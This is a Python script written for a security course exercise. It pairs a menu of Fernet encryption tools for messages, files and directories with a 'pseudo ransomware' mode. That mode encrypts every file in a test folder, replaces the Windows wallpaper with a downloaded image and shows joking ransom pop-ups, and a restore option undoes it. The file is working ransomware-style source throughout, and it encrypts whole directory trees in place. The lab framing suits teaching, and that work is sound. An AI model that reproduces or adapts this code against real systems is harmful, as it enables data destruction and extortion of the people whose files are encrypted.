#!/usr/bin/env python3

# Script:                   401 Op Challenge Day 8
# Author:                   Courtney Hans
# Date of latest revision:  10/14/20
# Purpose:                  Menu & execution for encryption (directory, file, string)
#                           and FULL ransomware and restore

# Import libraries

from cryptography.fernet import Fernet
import os, math, time, datetime, getpass, os.path
import urllib.request
import ctypes
import pyautogui
import win32ui
import win32con

# Declare variables
dir_count = 0
file_count = 0
user_name = os.path.expanduser("~")
ab_path = f"{user_name}/OneDrive/Desktop/"
ransom_path = f"{user_name}/OneDrive/Desktop/lab8folder" ## test path

# Declare functions

def write_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
        return key

def load_key():
    """
    Loads the key from the current directory named `key.key`
    """
    try:
        return open("key.key", "rb").read()
    except:
        return None

# function to write key only if it's not already there
def if_key():
    key = load_key()
    if key == None:
        key = write_key()
    return Fernet(key)

def encrypt_message():
    user_message = input("What message would you like to encrypt? ")
    message_e = user_message.encode()
    # initialize the Fernet class
    f = if_key()
    # encrypt the message
    encrypted = f.encrypt(message_e)
    print("Your encrypted message:")
    print(encrypted)

def decrypt_message():
    user_input = input("What message would you like to decrypt? ")
    message_d = str.encode(user_input)
    f = if_key()
    # decrypt the message
    decrypted = f.decrypt(message_d)
    # remove the 'b' and extra ""
    print("Your decrypted message:")
    print(str(decrypted)[2:-1])

def encrypt_file():
    f = if_key()
    filename = input("Please enter the full filepath for the file you wish to encrypt? ")
    with open(filename, "rb") as file:
        #read file data
        file_data = file.read()
    # encrypt data
    encrypted_file = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_file)

def decrypt_file():
    f = if_key()
    filename = input("Please enter the full filepath for the file you wish to decrypt? ")
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_doc = file.read()
    #decrypt data
    decrypted_info = f.decrypt(encrypted_doc)
    # write the original file
    with open (filename, "wb") as file:
        file.write(decrypted_info)

def recurse_encrypt(filename):
    f = if_key()
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_file = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_file)

def recurse_decrypt(filename):
    f = if_key()
    with open(filename, "rb") as file:
        encrypted_doc = file.read()
    decrypted_info = f.decrypt(encrypted_doc)
    with open (filename, "wb") as file:
        file.write(decrypted_info)

#Traverse & encrypt directory tree
def print_dirContents_encrypt():
    global dir_count
    global file_count
    start_path = input("Please enter the absolute path to the directory you want to encrypt: ")
    for (path,dirs,files) in os.walk(start_path):
        print("")
        print('Directory: {:s}'.format(path))
        print("")
        dir_count += 1
        #Repeat for each file in directory
        for file in files:
            fstat = os.stat(os.path.join(path,file))

            # Convert file size to MB, KB or Bytes
            if (fstat.st_size > 1024 * 1024):
                fsize = math.ceil(fstat.st_size / (1024 * 1024))
                unit = "MB"
            elif (fstat.st_size > 1024):
                fsize = math.ceil(fstat.st_size / 1024)
                unit = "KB"
            else:
                fsize = fstat.st_size
                unit = "B"

            mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))

            # Print file attributes
            print('encrypting \t{:15.15s}{:8d} {:2s} {:18s}'.format(file,fsize,unit,mtime))
            file_count += 1
            filename = os.path.join(path,file)
            recurse_encrypt(filename)
            
    # Print total files and directory count
    print('\nEncrypted {} files in {} directories.'.format(file_count,dir_count))
    print("")
    dir_count = 0
    file_count = 0    

#Traverse & decrypt directory tree
def print_dirContents_decrypt():
    global dir_count
    global file_count
    start_path = input("Please enter the absolute path to the directory you want to decrypt: ")
    for (path,dirs,files) in os.walk(start_path):
        print("")
        print('Directory: {:s}'.format(path))
        print("")
        dir_count += 1
        #Repeat for each file in directory
        for file in files:
            fstat = os.stat(os.path.join(path,file))

            # Convert file size to MB, KB or Bytes
            if (fstat.st_size > 1024 * 1024):
                fsize = math.ceil(fstat.st_size / (1024 * 1024))
                unit = "MB"
            elif (fstat.st_size > 1024):
                fsize = math.ceil(fstat.st_size / 1024)
                unit = "KB"
            else:
                fsize = fstat.st_size
                unit = "B"

            mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))

            # Print file attributes
            print('decrypting \t{:15.15s}{:8d} {:2s} {:18s}'.format(file,fsize,unit,mtime))
            file_count += 1
            filename = os.path.join(path,file)
            recurse_decrypt(filename)
    # Print total files and directory count
    print('\nDecrypted {} files in {} directories.'.format(file_count,dir_count))
    print("")
    dir_count = 0
    file_count = 0   

# Change desktop background (Windows)
def change_desktop_background():
    global ab_path
    imageUrl = 'https://www.wweek.com/resizer/86tt-U3ytIrtb7bBYXAIg7XWz7A=/1200x0/filters:quality(100)/s3.amazonaws.com/arc-wordpress-client-uploads/wweek/wp-content/uploads/2019/08/30145212/Nicolas-Cage.jpg'
    # Go to specif url and download+save image using absolute path
    path = f'{ab_path}malware_pic.jpg'
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    # Access windows dlls for funcionality eg, changing dekstop wallpaper
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

# Restore desktop background (Windows)
def restore_background():
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, 'C:\Windows\Web\Wallpaper\Windows\img0.jpg', 0)

# Series of simple pop-ups
def pop_up():
    pyautogui.alert("YO- you been 'Caged'!", "RANSOMWARE ALERT!!!!", button='WHAT!?!')
    pyautogui.alert("Seriously, though. All your files have been encrypted. Sorry 'bout your luck.", "RANSOMWARE ALERT!!!!", button='What do I do now?!')
    pyautogui.alert("You may need a glass of wine for this.", "RANSOMWARE ALERT!!!!", button='Aw dang!')
    pyautogui.alert("Okay, just fooling. Return to your terminal, try again, and enter '8' to restore and all will be well.", "RANSOMWARE ALERT!!!!", button='Phew!')

#Ransomware encryption in test directory
def ransomware():
    start_path = ransom_path
    for (path,dirs,files) in os.walk(start_path):
        for file in files:
            fstat = os.stat(os.path.join(path,file))
            filename = os.path.join(path,file)
            recurse_encrypt(filename)
    change_desktop_background()
    time.sleep(1)
    pop_up()
            
#Ransomware attack restoration
def ransomware_restore():
    start_path = ransom_path
    for (path,dirs,files) in os.walk(start_path):
        for file in files:
            fstat = os.stat(os.path.join(path,file))
            filename = os.path.join(path,file)
            recurse_decrypt(filename)
    restore_background()
    print("System restored! You can pay me in cookies.")
            
###############################################

### Menu of options ###
def ask_user():
    mode = input("\nWhat would you like to do?\
    \nMode 1 - Encrypt a message\
    \nMode 2 - Decrypt a message\
    \nMode 3 - Encrypt a file\
    \nMode 4 - Decrypt a file\
    \nMode 5 - Encrypt a folder and its contents\
    \nMode 6 - Decrypt a folder and its contents\
    \nMode 7 - FULL (psuedo) RANSOMWARE ATTACK!\
    \nMode 8 - RESTORE from ransomware\
    \n\
    \nPlease enter a number: ")

    if (mode == "1"):
        encrypt_message()
    elif (mode == "2"):
        decrypt_message()
    elif (mode== "3"):
        encrypt_file()
        print("...file encrypted.")
    elif (mode == "4"):
        decrypt_file()
        print("...file decrypted.")
    elif (mode == "5"):
        print_dirContents_encrypt()
    elif (mode == "6"):
        print_dirContents_decrypt()
    elif (mode == "7"):
        ransomware()
    elif (mode == "8"):
        ransomware_restore()
    else:
        print("Invalid selection...")

# Main

while True:
    ask_user()
    y_n = input ("Try again? y/n ")
    if y_n == "n":
        print("Have a nice day!")
        break

# resource: geeksforgeeks.org/python-os-path-expanduser-method/
# HUGE thanks to Jin Kim https://github.com/jinwoov

# End